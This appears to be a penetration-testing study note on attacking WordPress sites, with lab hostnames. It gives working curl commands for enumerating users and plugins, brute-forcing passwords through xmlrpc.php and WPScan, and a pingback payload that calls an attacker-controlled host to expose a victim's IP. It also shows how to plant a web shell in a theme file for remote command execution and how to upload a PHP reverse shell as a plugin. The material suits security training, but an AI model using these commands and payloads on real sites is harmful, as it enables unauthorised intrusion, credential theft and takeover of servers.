# Footprinting
A quick way to identify `Wordpress` site is through the `/robots.txt` file, which for a Wordpress site would look like this :
```bash
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```
Attempting to browse to the `wp-admin` directory will redirect us to the `wp-login.php` page.
```bash
http://blog.inlanefreight.local/wp-login.php
```

- Plugins are stored in the `wp-content/plugins` directory. This folder is helpful to enumerate vulnerable plugins.
- Themes are stored in the `wp-content/themes` directory.

Some interesting WordPress URLs are :
```bash
index.php
license.txt
wp-activate.php
wp-admin/login.php
wp-admin/wp-login.php
login.php
wp-login.php
xmlrpc.php
xml-rpc.php
wp-content/uploads/
wp-content/plugins/
wp-content/themes/
wp-includes/
wp-config.php
?author=1
wp-json/wp/v2/users
wp-json/wp/v2/users/1
wp-cron.php
wp-json/oembed/1.0/proxy?url=
feed
feed/rdf/
readme.html
.htaccess
_wpeprivate/config.json
wp-json/?rest_route=/wp/v2/users
wp-json/?rest_route=/wp/v2/users/1
wp-json/wp/v2/pages
wp-json/wp/v2/types/page
wp-json/wp/v2/comments?post=1
wp-json/wp/v2/pages/1/revisions
wp-json/wp/v2/pages/1/revisions/1
wp-json/wp/v2/media?parent=1
wp-sitemap.xml
wp-signup.php
.wp-config.php.swp
.wp-config.php.bak
```
# Enumeration
## Version
We can identify a `Wordpress` site version by looking at the source code and grepping the `meta generator` tag
```bash
curl -s -X GET http://blog.inlanefreight.local | grep WordPress
curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
```
Those infos can also be found in the source code. Aside from the `generator` tag, links to CSS & JS can also provide hints about the version number
```html
...SNIP...
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
...SNIP...
```
Or we can try to fetch those links to retrieve the WordPress version : 
```bash
/wordpress/wp-links-opml.php
/wp-links-opml.php
```
Once the WordPress version found, we can enumerate all the vulnerabilities for a unique WordPress version by browsing `https://wpscan.com/wordpress/$VERSION/`, and replacing the dots `.` in the version like : `https://wpscan.com/wordpress/642/`.
## Plugins & Themes
The source code may also provide info on the installed plugins.
```bash
# Getting installed plugins
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
curl -s http://blog.inlanefreight.local/ | grep plugins

# Plugins active enumeration (by sending a request to the server). Return a 404 if plugin does not exists
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

# Getting installed themes
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
curl -s http://blog.inlanefreight.local/ | grep themes
```
We can also retrieve the complete list of all available plugins & themes (from WordPress site), and fuzz our website(s) : 
```bash
# Retrieve the list of all available plugins & themes from WordPress official website
http://plugins.svn.wordpress.org/
https://themes.svn.wordpress.org/

# Then we can fuzz our website at :
http://website.com/wp-content/plugins/FUZZ/readme.txt
http://website.com/wp-content/themes/FUZZ/readme.txt

And look at the "stable tag" to retrieve the plugin version in use

# Or the following python script does it : 
from bs4 import BeautifulSoup
from typing import List

import requests
import bs4

PLUGIN_URL = "http://plugins.svn.wordpress.org/"

plugins = requests.get(PLUGIN_URL, headers={
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
}).text

soup = BeautifulSoup(plugins, "html.parser")

tags: List[bs4.element.Tag] = soup.findAll("a")

with open("wordpress_plugins.txt", "w") as f:
	f.write("\n".join([plugin.string for plugin in tags]))
```
We can also retrieve installed `plugins only` WITHOUT bruteforce using [wpprobe](https://github.com/Chocapikk/wpprobe)
Once we found valid plugins, we can look for available vulnerabilities at `https://wpscan.com/plugin/PLUGIN_NAME`
## Directory Indexing
Even if a plugin is `deactivate`, it may still be accessible if `directory indexing` hasn't been disabled. Some files may contain sensitive information or vulnerable code.
```bash
# View an accessible plugin directory & convert the HTML output to a readable format
curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```
## Users
There are 3 methods for manually enumerating usernames and retreive their IDs :
- The first one can be done by `reviewing posts` to uncover the ID assigned to the user & their corresponding username. Sometimes posts are shown with the `"posted by user"` mention, which could help us
![[Pasted image 20250318152630.png]]
The `admin` user is usually assigned the user ID `1`. We can confirm this by requesting the server. If the user `does not exist`, the server will respond w/ a `404 error`
```bash
# Confirming admin user w/ ID 1 exists
curl -s -I http://blog.inlanefreight.com/?author=1
```
- The second method for manually enumerating users requires interaction with the `JSON` endpoint, which allows us to obtain a list of users. This was changed in WordPress core `after version 4.7.1`, and later versions only show whether a user is configured or not. 
```bash
# Enumerating users through JSON endpoint (will also return the ID of the user)
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```
- The last method for enumerating users is through the default login page at `/wp-login.php`. We could compare the error messages when enterring a `valid` username and a `non-existing` one. We could have error messages like `invalid password for user X` when valid and `invalid username or password` for invalid.
## WPScan
[WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool, determines if the various themes and plugins used by a blog are outdated or vulnerable. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token` parameter.
```bash
# Enumerate plugins, themes, and users
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```
## Attacking Vulnerable Plugins
When running a `WPScan`, we should always grab an `api token` to inherit the `VulnDB` database and look for potential vulnerabilities in plugins. Some plugins may have unsificcient protections in place, and may allow `LFI`, `command execution`, etc...
- The `WPScan + api token` output will always provide documentation links for the vulnerabilities found. We should always take time to view them for potential first access
## Attacking 'xmlrpc.php'
`xmlrpc.php` being enabled on a WordPress instance is not a vulnerability ! Depending on the methods allowed, `xmlrpc.php` can facilitate some enumeration and exploitation activities, though.
- Let's say we've found a valid username `admin` and `xmlrpc.php` is enabled (to verify we just have to request the `xmlrpc.php` page)
- We could mount a `password brute-forcing` attack through `xmlrpc.php`. We should receive a `403 faultCode error` if the credentials aren't correct
```bash
# Bruteforcing password w/ xmlrpc.php
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
- To identify the correct method to call (here it's `system.listMethods`), we can use the well-documented [Wordpress code](https://codex.wordpress.org/XML-RPC/system.listMethods) and interacting with `xmlrpc.php`
```bash
# Retrieve the list of allowed methods to use. Should return a list 
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
- If in the list we find the [pingback.ping](https://codex.wordpress.org/XML-RPC_Pingback_API) method, it could facilitate several attacks : 
1. `IP Disclosure` - An attacker can call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
2. `Cross-Site Port Attack (XSPA)` - An attacker can call the `pingback.ping` method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
3. `DDoS` - An attacker can call the `pingback.ping` method on numerous WordPress instances against a single target.
We could use the `pingback` method w/ the following example request for the attacking machine to receive a request (pingback) exposing the victim's public IP address.
```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```



# Exploitation
## Bruteforcing
If we have a list of valid usernames, we could perform a bruteforce attack through the default login page at `/wp-login.php` or via the `xmlrpc.php` page. 
- We could mount a `password brute-forcing` attack through `xmlrpc.php`. We should receive a `403 faultCode error` if the credentials aren't correct
```bash
# Bruteforcing login w/ xmlrpc.php file
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
- `WPScan` can also be used to bruteforce usernames & passwords. WPScan supports both `wp-login.php` (attacking the default login page) and `xmlrpc` method (preferred as it's faster)
```bash
# Bruteforce using xmlrpc method
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```
**Note : when bruteforcing WordPress, always check different methods for the --password-attack (wp-login or xmlrpc) in the Wpscan options !**
## RCE
### With administrative access 
We can `modify the PHP source code` to execute system commands. When connecting to a user, which will redirect us to the admin panel, we can click on `Appearance` on the side panel and select `Theme Editor`. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme.
- We can then choose to edit a non-critical file such as `404.php` and add a web shell in it. We can add the following line `wherever` we want inside the `.php` page
```php
system($_GET['cmd']);
```
- We could now execute code by calling the `cmd` parameter 
```bash
# RCE
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```
- If we have access to an account that has sufficient rights to create files on the webserver, we could use the `wp_admin_shell_upload` module from `Metasploit` to obtain a reverse shell on the target
### Without administrative access
It may be possible to `upload .php` files as a `plugin`. 
Create a `php reverse shell` in a file called `shell.php`. Then we can add a new plugin in the `Plugin` menu, browse and upload our `shell.php` file, click on `Proceed`. If asked, we can enter `127.0.0.1` and `anonymous` as `FTP credentials`. 
Once done, we can browse our reverse shell through the `Media` → `Library` menu to get the path of our `shell.php` file.